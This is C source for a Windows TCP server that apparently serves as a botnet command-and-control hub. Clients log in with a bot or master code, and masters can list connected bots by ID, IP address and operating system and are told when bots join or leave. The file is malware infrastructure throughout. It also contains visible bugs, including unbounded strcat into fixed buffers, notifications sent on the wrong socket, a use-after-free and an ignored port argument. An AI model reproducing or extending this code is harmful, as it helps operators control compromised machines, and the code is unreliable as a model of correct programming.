#include <stdio.h>
#include <winsock.h>
#include <rpc.h>

#include "server.h"
#include "socket.h"
#include "utils.h"
#include "log.h"
#include "error.h"
#include "config.h"
#include "guid.h"

/*
*	ClientNew: Insert client context into linked list
*		@pServer - Pointer to server context structure
*		@Socket	 - Client socket
*		@Address - Pointer to client socket address structure
*/
PCLIENT_CONTEXT ClientNew(
	PSERVER_CONTEXT pServer,
	SOCKET			Socket,
	SOCKADDR_IN*	Address
)
{
	WINERROR Status = NO_ERROR;
	PCLIENT_CONTEXT pClient = NULL;

	if (!(pClient = malloc(sizeof(CLIENT_CONTEXT))))
		return NULL;

	memset(pClient, 0, sizeof(CLIENT_CONTEXT));

	InitializeListHead(&pClient->Entry);

	pClient->Server = pServer;
	pClient->Socket = Socket;
	pClient->Address = Address;
	pClient->Id = GenGuidName((PULONG)GetTickCount(), NULL, NULL);
	pClient->Status = STATUS_AUTH_PENDING;

	EnterCriticalSection(&pServer->ClientListLock);
	InsertTailList(&pServer->ClientListHead, &pClient->Entry);
	LeaveCriticalSection(&pServer->ClientListLock);

	return pClient;
}

VOID NotifyMasters(PCLIENT_CONTEXT pClient, PCHAR Data)
{
	CHAR		Temp[512];

	EnterCriticalSection(&pClient->Server->ClientListLock);
	PLIST_ENTRY List = pClient->Server->ClientListHead.Flink;
	wsprintf(Temp, "%s\n", Data);
	while (List != &pClient->Server->ClientListHead)
	{
		PCLIENT_CONTEXT Client = CONTAINING_RECORD(List, CLIENT_CONTEXT, Entry);
		if (Client->Permission == PERMISSION_MASTER)
		{
			strcat(Temp, pClient->Id);
			strcat(Temp, "\n");
			strcat(Temp, inet_ntoa(pClient->Address->sin_addr));
			strcat(Temp, "\n");
			strcat(Temp, pClient->OS);
			strcat(Temp, "\n");
			send(pClient->Socket, Temp, strlen(Temp) + 1, 0);
		}
		List = List->Flink;
	}

	LeaveCriticalSection(&pClient->Server->ClientListLock);
	SocketResetData(&pClient->DataCtx);
}


/*
*	ClientDelete: Close sockets, remove client entry from linked list
*		@pClient - Pointer to client context structure
*/
PCLIENT_CONTEXT ClientDelete(PCLIENT_CONTEXT pClient)
{
	EnterCriticalSection(&pClient->Server->ClientListLock);
	if (pClient->Status == STATUS_AUTH_OK)
	{
		if (pClient->Permission == PERMISSION_BOT)
		{
			ConsoleOutput(PEER_QUIT, "Quit: %s:%d", inet_ntoa(pClient->Address->sin_addr), ntohs(pClient->Address->sin_port));
			NotifyMasters(pClient, "BOT_QUIT");
			if (((PSERVER_CONTEXT)pClient->Server)->NumberOfClients != 0)
				((PSERVER_CONTEXT)pClient->Server)->NumberOfClients -= 1;
		}
		else if (pClient->Permission == PERMISSION_MASTER)
			ConsoleOutput(PEER_QUIT, "Master Quit: %s:%d", inet_ntoa(pClient->Address->sin_addr), ntohs(pClient->Address->sin_port));
			if (((PSERVER_CONTEXT)pClient->Server)->NumberOfMasters != 0)
				((PSERVER_CONTEXT)pClient->Server)->NumberOfMasters -= 1;
	}

	SocketResetData(&pClient->DataCtx);
	closesocket(pClient->Socket);
	RemoveEntryList(&pClient->Entry);
	LeaveCriticalSection(&pClient->Server->ClientListLock);

	return pClient;
}

/*
*	ClientParse: Parse incoming client data
*		@pClient - Pointer to client context structure
*/
VOID ClientParse(PCLIENT_CONTEXT pClient)
{
	CHAR	Temp[512];
	CHAR	Buffer[4096];
	CHAR	*Split[512];
	PCHAR	Token	= NULL;
	INT		i		= 0;

	memset(Temp, 0, sizeof(Temp));
	memset(Buffer, 0, sizeof(Buffer));

	ConsoleOutput(NONE_ERROR, "Recevied Data from %s: %s", pClient->Id, pClient->DataCtx.Data.Message);

	if (pClient->Permission == PERMISSION_MASTER)
	{
		if (!memcmp(pClient->DataCtx.Data.Message, "SERVER_INFO", pClient->DataCtx.Data.Length))
		{
			wsprintf(Buffer, "SERVER_INFO\n%d\n%d\n", pClient->Server->NumberOfClients, pClient->Server->NumberOfMasters);
			SocketSend(pClient->Socket, Buffer, (USHORT)strlen(Buffer) + 1);
		}
		else if (!memcmp(pClient->DataCtx.Data.Message, "BOT_LIST_BASIC", pClient->DataCtx.Data.Length))
		{
			PLIST_ENTRY List = pClient->Server->ClientListHead.Flink;
			wsprintf(Buffer, "BOT_LIST_BASIC\n");
			while (List != &pClient->Server->ClientListHead)
			{
				PCLIENT_CONTEXT Client = CONTAINING_RECORD(List, CLIENT_CONTEXT, Entry);
				if (Client->Permission == PERMISSION_BOT)
				{
					strcat(Buffer, Client->Id);
					strcat(Buffer, "\t\t");
					strcat(Buffer, inet_ntoa(Client->Address->sin_addr));
					strcat(Buffer, "\t\t");
					strcat(Buffer, GetOperatingSystemString(GetOperatingSystem()));
					strcat(Buffer, "\n");
				}
				List = List->Flink;
			}
			sprintf(Temp, "Total: %d\n", pClient->Server->NumberOfClients);
			strcat(Buffer, Temp);
			SocketSend(pClient->Socket, Buffer, (USHORT)strlen(Buffer) + 1);
		}
	}
	else if (pClient->Permission == PERMISSION_BOT)
	{
		Token = strtok(pClient->DataCtx.Data.Message, "\n");
		do
		{
			Split[i++] = Token;
		} while (Token = strtok(NULL, "\n"));
	}

	SocketResetData(&pClient->DataCtx);
}

/*
*	ClientAuthenticate: Authenticate clients and determine permission level
*		@pClient - Pointer to client context structure
*/
WINERROR ClientAuthenticate(PCLIENT_CONTEXT pClient)
{
	WINERROR	Status = NO_ERROR;
	CHAR*		Buffer[256];
	PCHAR		Token;
	ULONG		Read;
	USHORT		Arg = 0;

	Read = SocketRead(pClient->Socket, &pClient->DataCtx);
	if (Read == CONNECTION_ALIVE)
	{
		Token = strtok(pClient->DataCtx.Data.Message, "\n");
		do
		{
			if (Arg >= sizeof(Buffer)/sizeof(PCHAR))
				break;
			Buffer[Arg++] = Token;
		} while (Token = strtok(NULL, "\n"));

		if (!memcmp(Buffer[0], BOT_CODE, strlen(Buffer[0])))
		{
			pClient->Permission = PERMISSION_BOT;
			pClient->OS = GetOperatingSystemString(atoi(Buffer[2]));

			ConsoleOutput(PEER_JOIN, "Join: %s (%s:%d) [%s]", pClient->Id, inet_ntoa(pClient->Address->sin_addr), ntohs(pClient->Address->sin_port), pClient->OS);
			NotifyMasters(pClient, "BOT_JOIN");
			((PSERVER_CONTEXT)pClient->Server)->NumberOfClients++;
		}
		else if (!memcmp(Buffer[0], MASTER_CODE, strlen(Buffer[0])))
		{
			ConsoleOutput(PEER_JOIN, "Master Join: %s (%s:%d)", pClient->Id, inet_ntoa(pClient->Address->sin_addr), ntohs(pClient->Address->sin_port));
			pClient->Permission = PERMISSION_MASTER;
			((PSERVER_CONTEXT)pClient->Server)->NumberOfMasters++;
		}
		else
		{
			ConsoleOutput(PEER_QUIT, "Auth: %s:%d failed attempt!\n", inet_ntoa(pClient->Address->sin_addr), ntohs(pClient->Address->sin_port));
			ClientDelete(pClient);
			Status = ERROR_UNSUCCESSFULL;
		}

		SocketResetData(&pClient->DataCtx);

		if (Status == NO_ERROR)
			pClient->Status = STATUS_AUTH_OK;
	}
	else if (Read == CONNECTION_DEAD)
		Status = ERROR_UNSUCCESSFULL;

	return Status;
}

/*
*	ClientThread: Start thread for processing clients
*		@pClient - Pointer to client context structure
*/
VOID ClientThread(PCLIENT_CONTEXT pClient)
{
	WINERROR Status = NO_ERROR;
	INT Read;
	ULONG Mode = 0;

	while (pClient)
	{
		if (ioctlsocket(pClient->Socket, FIONBIO, &Mode))
			break;

		if (pClient->Status == STATUS_AUTH_PENDING)
		{
			if ((Status = ClientAuthenticate(pClient)) != NO_ERROR)
			{
				pClient = ClientDelete(pClient);
				continue;
			}
		}
		else if (pClient->Status == STATUS_AUTH_OK)
		{
			Read = SocketRead(pClient->Socket, &pClient->DataCtx);
			if (Read == CONNECTION_ALIVE)
			{
				ClientParse(pClient);
			}
			else if (Read == CONNECTION_DEAD)
			{
				pClient = ClientDelete(pClient);
				continue;
			}
		}
	};
}

/*
*	ServerAcceptThread: Start thread for accepting incoming connections
*		@pServer - Pointer to server context structure
*/
VOID ServerAcceptThread(PSERVER_CONTEXT pServer)
{
	SOCKET			Socket;
	SOCKADDR_IN		Address;
	ULONG			Length		= sizeof(SOCKADDR_IN);
	PCLIENT_CONTEXT pClient = NULL;
	
	while ((Socket = accept(pServer->Socket, (struct sockaddr *)&Address, &Length)) != INVALID_SOCKET)
	{
		if (!Socket)
			continue;

		if ((pClient = ClientNew(pServer, Socket, &Address)) == NULL)
			closesocket(Socket);

		if (!(pClient->WorkerThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ClientThread, pClient, 0, &pClient->WorkerThreadId)))
			closesocket(Socket);
	}
}

/*
*	StartServer: Start TCP server
*		@Port - Target port to start listening server
*/
WINERROR ServerStart(USHORT Port)
{
	PSERVER_CONTEXT pServer = NULL;
	WINERROR		Status = NO_ERROR;
	ULONG			Mode = 0;

	do
	{
		if (SocketInitialize() < 0)
		{
			Status = ERROR_UNSUCCESSFULL;
			break;
		}

		if (!(pServer = malloc(sizeof(SERVER_CONTEXT))))
		{
			Status = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}

		memset(pServer, 0, sizeof(SERVER_CONTEXT));

		InitializeCriticalSection(&pServer->ClientListLock);
		InitializeListHead(&pServer->ClientListHead);

		pServer->Address.sin_family		 = AF_INET;
		pServer->Address.sin_addr.s_addr = htonl(INADDR_ANY);
		pServer->Address.sin_port		 = htons(Port);

		if ((pServer->Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET)
		{
			Status = ERROR_UNSUCCESSFULL;
			break;
		}

		if (bind(pServer->Socket, (struct sockaddr *)&pServer->Address, sizeof(SOCKADDR_IN)) == SOCKET_ERROR)
		{
			Status = ERROR_UNSUCCESSFULL;
			break;
		}

		if (listen(pServer->Socket, SOMAXCONN) == SOCKET_ERROR)
		{
			Status = ERROR_UNSUCCESSFULL;
			break;
		}

		if (!(pServer->AcceptThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&ServerAcceptThread, pServer, 0, &pServer->AcceptThreadId)))
		{
			Status = ERROR_UNSUCCESSFULL;
			break;
		}

		ConsoleOutput(SERVER_MESSAGE, "Server: listening on %s:%d", inet_ntoa(pServer->Address.sin_addr), ntohs(pServer->Address.sin_port));
	} while (FALSE);

	if (Status == ERROR_UNSUCCESSFULL)
	{
		free(pServer);
		SocketShutdown(pServer->Socket, &pServer->DataCtx);
	}

	return (Status);
}

WINERROR __cdecl main(int argc, char *argv[])
{
	if (argc < 2)
	{
		ConsoleOutput(NONE_ERROR, "Usage: server.exe [port]\n", argv[1]);
		return ERROR_UNSUCCESSFULL;
	}

	if ((ServerStart(1337) != NO_ERROR))
	{
		printf("SERVER: Failed to start server! (%d)\n", GetLastError());
		return ERROR_UNSUCCESSFULL;
	}

	getchar();
	return NO_ERROR;
}
